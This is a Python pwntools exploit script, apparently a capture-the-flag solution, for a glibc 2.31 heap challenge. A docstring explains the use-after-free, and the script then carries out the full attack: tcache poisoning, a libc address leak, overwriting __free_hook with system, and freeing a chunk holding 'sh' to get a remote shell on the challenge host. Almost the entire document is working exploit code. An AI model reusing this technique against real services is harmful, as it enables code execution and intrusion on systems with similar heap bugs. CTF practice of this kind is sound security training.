#!/usr/bin/env python3
from pwn import *                     

'''
This CTF challenge is a dynamic allocater misuse vulnerability with glibc 2.31
We abuse the tcache to perform tcache poisoning, overwriting __free_hook with a pointer to system
This challenge keeps track of allocated chunks in an region named chunks.
every time a chunk is allocated the address of the chunk is placed in the chunks region
an issue here is that when we free a chunk, they are not removed from the chunks region.
so if we try to allocate a new chunk at the same index of a chunk that we freed the program complains
saying there is already a chunk allocated there. this would result in a double free vulnerability due
to the way the <free_chunk> function works, but since it is glibc 2.31 this is mitigated (i think?)
'''

context.log_level = "critical"

def allocate_chunk(i):
    p.sendline(b"1")
    p.recvuntil(b"Index (0-9): ")
    p.sendline(i)
    res = p.recvuntil(b"Choice: ")
    if b"already" in res:
        print(f"[+] chunk {i.decode()} already allocated!")
    else:
        print(f"[+] Allocated chunk {i.decode()}")

def free_chunk(i):
    p.sendline(b"2")
    p.recvuntil(b"Index (0-9): ")
    p.sendline(i)
    p.recvuntil(b"Choice: ")
    print(f"[-] Free'd chunk {i.decode()}")

def free_exec_chunk(i):
    p.sendline(b"2")
    p.recvuntil(b"Index (0-9): ")
    p.sendline(i)
    print(f"[?] shell")

def edit_chunk(i, string):
    print(f"[*] Editing chunk {i.decode()}")
    p.sendline(b"3")
    p.recvuntil(b"Index (0-9): ")
    p.sendline(i)
    p.recvuntil(b"Enter data: ")
    p.sendline(string)
    p.recvuntil(b"Choice: ")

def view_chunk(i):
    print(f"[*] Viewing chunk {i.decode()}")
    p.sendline(b"4")
    p.recvuntil(b"Index (0-9): ")
    p.sendline(i)
    result = p.recvuntil(b"Choice: ").split(b"\n")[0]
    return result

chunks = [b"\xf0\x3f\x40", b"\x08\x40\x40", b"\x28\x40\x40"]

if __name__ == "__main__":
    p = remote("0.cloud.chals.io", 11289)
     
    p.recvuntil(b"Choice: ")
    for i in range(0,2,1): 
        allocate_chunk(str(i).encode("utf-8"))
     
    for i in range(0,2,1):
        free_chunk(str(i).encode("utf-8"))
     
    for i in range(0,2,1):
        edit_chunk(str(i).encode("utf-8"), chunks[2])
        print(view_chunk(str(i).encode("utf-8"))[::-1].hex())

    for i in range(2,4,1): 
        allocate_chunk(str(i).encode("utf-8"))
    
    leak = view_chunk(b"3")[::-1].hex()
    libc = int(leak, 16) - 0x84420
    __free_hook = libc + 0x1eee48
    __malloc_hook = libc + 0x1ecb70
    system = libc + 0x52290
    
    print("[+] leak:", leak)
    print("[+] __free_hook:", hex(__free_hook))
    print("[+] system:", hex(system))
    print("[+] libc leak:", hex(libc))

    free_chunk(b"2")
    allocate_chunk(b"4")
    allocate_chunk(b"5")
    free_chunk(b"4")
    free_chunk(b"5")
    edit_chunk(b"4", p64(__free_hook))
    print(view_chunk(b"4")[::-1].hex())
    edit_chunk(b"5", p64(__free_hook))
    print(view_chunk(b"5")[::-1].hex())
    allocate_chunk(b"6")
    allocate_chunk(b"7")
    edit_chunk(b"7", p64(system))
    print(view_chunk(b"7")[::-1].hex())
     
    allocate_chunk(b"8")
    edit_chunk(b"8", b"sh")
    
    print(view_chunk(b"8"))

    free_exec_chunk(b"8")
    p.interactive()
